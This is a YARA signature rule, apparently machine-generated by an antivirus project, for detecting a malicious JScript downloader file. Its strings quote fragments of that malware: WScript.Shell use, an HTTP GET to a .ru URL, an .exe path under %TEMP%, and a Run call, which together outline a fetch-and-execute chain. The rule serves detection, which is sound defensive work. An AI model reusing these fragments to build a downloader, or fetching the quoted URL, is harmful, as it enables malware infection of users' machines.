rule sig_20160401_51d4e34fa69bd7348a10712897da2cc1 {
  meta:
    description = "datamaliciousorder - file 20160401_51d4e34fa69bd7348a10712897da2cc1.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "29a7539f684756e6c32550af3855a9f2bb052ada15ad85fe6971749ee7924ad3"

  strings:
    $s1  = "function SozNuv(NkFw, UdyTcr){JcsJvx = JcsJvx * 1; return NkFw - UdyTcr;};" fullword ascii
    $s2  = "var OjAu = function JhhYqq() {return WScript[CuwMwe](\"WScript\"+\".Shell\");}(), WnUdy = 11;" fullword ascii
    $s3  = "if (QliPj[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "QliPj[QgaEu](\"G\" + \"ET\", \"http://teamlight-pro.ru/j7esp\", false);" fullword ascii
    $s5  = "function MfbHy(){return WaWrq + \"\";};" fullword ascii
    $s6  = "function YgNo() {return OjAu[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"cfsFwWJG.ex\" + \"e\";};" fullword ascii
    $s7  = "function GihQib() {return ((RuYvb == true) && (RuYvb == GhLq)) ? 1 : JcsJvx;};" fullword ascii
    $s8  = "function CreQp(){return 23;};" fullword ascii
    $s9  = "function QlaJtc(NsuRpx){OjAu[\"R\"+\"un\"](NsuRpx, JcsJvx, JcsJvx);};" fullword ascii
    $s10 = "function YduKv(){return CuwMwe;};" fullword ascii
    $s11 = "function OgXnv(MfTmi) {var JmYng = (1, 2, 3, 4, 5, MfTmi); return JmYng;};" fullword ascii
    $s12 = "var ZoEvw = new this[\"Date\"]();" fullword ascii
    $s13 = "}while (NpNlg);" fullword ascii
    $s14 = "return SozNuv(MfEwe, UgQso);" fullword ascii
    $s15 = "var RuYvb = false;" fullword ascii
    $s16 = "GhLq = true; " fullword ascii
    $s17 = "function AqUc()" fullword ascii
    $s18 = "RuYvb = true; " fullword ascii
    $s19 = "var VzrAml = false;" fullword ascii
    $s20 = "var GhLq = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}